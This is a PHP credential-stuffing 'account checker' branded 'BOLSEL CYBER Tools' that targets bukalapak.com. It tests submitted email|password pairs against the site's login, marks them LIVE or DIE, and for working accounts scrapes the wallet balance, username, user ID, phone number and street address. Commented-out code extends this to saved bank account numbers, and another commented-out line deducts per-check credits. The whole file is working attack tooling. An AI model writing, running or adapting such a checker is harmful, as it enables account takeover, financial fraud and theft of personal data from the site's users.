<?php
session_start();
error_reporting(0); 
?>
<?php
// 1: NOTICE, -1: UNCHECK, 2: DIE, 3: BAD/SOCKS DIE, 0: LIVE //
date_default_timezone_set("Asia/Jakarta");
$format = $_POST['mailpass'];
$pisah = explode("|", $format);
$sock = $_POST['sock'];
$hasil = array();

if (!isset($format)) {
header('location: ./');
exit;
}
require 'includes/class_curl.php';
if (isset($format)){
	
	// cek wrong
	if ($pisah[1] == '' || $pisah[1] == null) {
		die('{"error":-1,"msg":"<font color=red><b>UNKNOWN</b></font> | Unable to checking"}');
	}
    $curl = new curl();
    $curl->cookies('simpan/'.md5($_SERVER['REMOTE_ADDR']).'.txt');
    $curl->ssl(0, 2);

    $url = "https://www.bukalapak.com/user_sessions";

	$page = $curl->get($url);

	if ($page) {
	    $token = getStr($page,'<input type="hidden" name="authenticity_token" value="','" />');
		$data = "utf8=%E2%9C%93&authenticity_token={$token}&comeback=&token=&buyer_id=&from=&seller_id=&blca=&user_session%5Busername%5D={$pisah[0]}&user_session%5Bpassword%5D={$pisah[1]}&user_session%5Bremember_me%5D=0&commit=Login";
		$page = $curl->post($url, $data);

		if (inStr($page, "yang Anda masukkan salah. Silakan coba lagi.")) {
			die('{"error":2,"msg":"<font color=red><b>DIE</b></font> | '.$pisah[0].' | '.$pisah[1].'"}');
		} else if (inStr($page, "myLapak")) {
			// Grab Saldo
			$page_saldo = $curl->get('https://www.bukalapak.com/dompet');
			$string_saldo = getStr($page_saldo, 'amount positive','</span');
			$potong = substr($string_saldo,2);
			if ($string_saldo == null) {
				$saldo = "No Balance | ";
			} else {
				$saldo = "<b>Saldo : $potong</b> |";
			}

			// Grab Username
			$page_username = $curl->get('https://www.bukalapak.com/account_settings');
			$string_username = getStr($page_username, '<a class="nav-helper__link-alt" href="/','">');
			if ($string_username == null) {
				$username = "";
			} else {
				$username = "Username : $string_username | ";
			}

			// Grab Full billing
			$page_billing = $curl->get('https://www.bukalapak.com/user_addresses');
			$ambil_token = getStr($page_billing, '<a class="cbox-address-pwd btn btn--green btn--small" data-no-turbolink="true" href="/user_addresses/','/auth?comeback=http%3A%2F%2Fwww.bukalapak.com%2Fuser_addresses">Set utama</a>
</div>');
if ($ambil_token == null) {
	$tokenz = "";
} else {
	$tokenz = "User ID : $ambil_token | ";
}
			$page_billing_address = $curl->get('https://www.bukalapak.com/user_addresses/'.$ambil_token.'/edit');
			$jenis_alamat  = getStr($page_billing_address, 'type="text" value="','" name="user_address[title]"');
			if ($jenis_alamat == null) {
				$jenisnya = "";
			} else {
				$jenisnya = "$jenis_alamat | ";
			}
			$alamat = getStr($page_billing_address, 'id="user_address_address_attributes_address">','</textarea>');
			if ($alamat == null) {
				$alamatnya = "";
			} else {
				$alamatnya = "$alamat";
			}
			$provinsi = getStr($page_billing_address, '<option selected="selected" value="','">');
			if ($provinsi == null) {
				$provinsinya = "";
			} else {
				$provinsinya = "$provinsi";
			}
			// Get telepon
			$string_telepon = getStr($page_billing_address, 'size="16" value="','" name="user_address[phone]"');
			if ($string_telepon == null) {
				$telepon = "";
			} else {
				$telepon = "No Hp : $string_telepon | ";
			}
			/*
			// Full Billing Grab
			$full_billing = "Jenis : $jenisnya | Address : $alamatnya, $provinsinya | No Telp : $telepon | ";
			if ($alamatnya == 'Unknow Address') {
				$full_alamat = " | ";
			} else {
				$full_alamat = "$full_billing";
			}

			// Grab Saved Bank 
			/* $page_bank = $curl->get('https://www.bukalapak.com/payment/bank_accounts');
			$token_bank = getStr($page_bank, '<a class="btn btn--green btn--small" rel="nofollow" data-method="patch" href="/payment/bank_accounts/','/set_primary">Set utama</a>');
			if ($token_bank == null) {
				$token_bank_id = "";
			} else {
				$token_bank_id = "$token_bank";
			}
			$page_bank_saved = $curl->get('https://www.bukalapak.com/payment/bank_accounts/'.$token_bank.'/edit');
			$nomer_rekening = getStr($page_bank_saved, 'class='set-list__col set-list--name'><span>','</span></div');
			$nama_bank_saved = getStr($page_bank_saved, 'class='set-list__col set-list--name'><span>','</span></div');
			If ($nama_bank_saved == null) {
				$nama_bank = "";
			} else {
				$nama_bank = "[$nama_bank_saved]";
			}
			if ($nomer_rekening == null) {
				$rekening = "";
			} else {
				$rekening ="$nama_bank - <b>$nomer_rekening</b>";
			} */
			
			// update Balance CRE
			// mysql_query("UPDATE `user` SET `credits`=credits-1 WHERE email='$email'");
			$result = array();
			$result['error'] = 0;
			$result['msg'] = '<font color=green><b>LIVE</b></font> | '.$pisah[0].' | '.$pisah[1].' | <font color=green>'.$saldo.'</font> <font color=red>'.$username.'</font> <font color=blue>'.$telepon.'</font> <font color=red>'.$provinsinya.'</font> <font color=blue>'.$alamatnya.'</font> <font color=red>'.$jenisnya.'</font> <font color=blue>'.$tokenz.'</font> [CRE:'.$credit.'] [ACC:BUKALAPAK] BOLSEL CYBER Tools';
			
			die(json_encode($result));
		} else {
			die('{"error":-1,"msg":"<font color=red><b>UNCHECK</b></font> | '.$pisah[0].' | '.$pisah[1].'"}');
		}
	} else {
		die('{"error":-1,"msg":"<font color=red><b>UNCHECK</b></font> | '.$pisah[0].' | '.$pisah[1].' | Unable to connect Bukalapak.com"}');
	}
}
?>